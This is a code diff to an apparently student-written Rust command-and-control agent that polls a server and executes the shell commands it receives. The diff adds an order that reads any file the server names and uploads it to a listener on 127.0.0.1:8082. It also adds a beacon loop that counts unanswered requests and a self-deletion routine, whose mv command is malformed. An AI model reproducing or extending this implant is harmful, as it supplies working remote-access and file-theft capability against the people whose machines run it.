@@ -3,9 +3,10 @@ use std::{
     thread,
     time::Duration,
     process::{Command, Output},
-    str
+    str,
+    env
 };
-use reqwest;
+use reqwest::{header::CONTENT_TYPE};
 use serde::{Serialize, Deserialize};
 use bytes::Bytes;
 
@@ -14,6 +15,7 @@ use bytes::Bytes;
 enum OrdreType {
     Commande,
     Fichier,
+    GetFichier,
     Vitesse,
     Autre
 }
@@ -86,6 +88,10 @@ async fn sending_request(t : u64) -> Option<u64>{
                                         }
                                     }
                                 },
+                                OrdreType::GetFichier => {
+                                    let filename = v.arguments[0].as_str();
+                                    get_file(filename).await;
+                                }
                                 OrdreType::Vitesse => {
                                     let new_vitesse = v.arguments[0].parse::<u64>().unwrap();
                                     return Some(new_vitesse);
@@ -115,6 +121,33 @@ async fn sending_request(t : u64) -> Option<u64>{
 
     thread::sleep(Duration::from_millis(t));
     return None;
+}
+
+
+async fn get_file(filename: &str) -> () {
+    let client = reqwest::Client::new();
+
+    let file = std::fs::read(filename).unwrap();
+
+    let response = client.post("http://127.0.0.1:8082")
+    .header(CONTENT_TYPE, "multipart/form-data")
+    .body(file)
+    .send()
+    .await;
+
+    match response{
+        Ok(v) => {
+            match v.status() {
+                reqwest::StatusCode::OK => {
+                    println!("{}", v.text().await.unwrap());
+                },
+                _ => {
+                    panic!("Uh oh! Something unexpected happened.");
+                }
+            };
+        },
+        Err(_err) => ()
+    };
 }
 
 
@@ -172,14 +205,36 @@ async fn sending_request_with_result(result_command : Output) -> Result<()> {
     return Ok(());
 }
 
-fn main() {
-    let boucle : bool = true;
-    let mut delay_in_sec: f64 = 5.0; 
-    while boucle {
-        let result = sending_request((delay_in_sec*(1000 as f64)) as u64);
-        match result {
-            Some (new_time) =>  {delay_in_sec = new_time as f64},
-            None => {}
+fn autodestroy(){
+    let path = env::current_dir();
+    match path {
+        Ok(v) => {
+            println!("{}", v.display());
+        },
+        _ => {
+            println!("An error occured catching the current path");
         }
     }
+    exec_commande_shell("mv".to_string(), vec!["".to_string(), "/dev/NULL".to_string()]).unwrap();
+
+}
+
+
+fn main() {
+    let mut delay_in_sec: f64 = 5.0; 
+    let mut number_of_request_without_response = 0;
+    while number_of_request_without_response < 1000000 {
+        let result = sending_request((delay_in_sec*(1000 as f64)) as u64);
+        match result {
+            Some (new_time) =>  {
+                delay_in_sec = new_time as f64;
+                number_of_request_without_response = 0;
+            },
+            None => {
+                number_of_request_without_response = number_of_request_without_response +1;
+            }
+        }
+    }
+    autodestroy();
+
 }
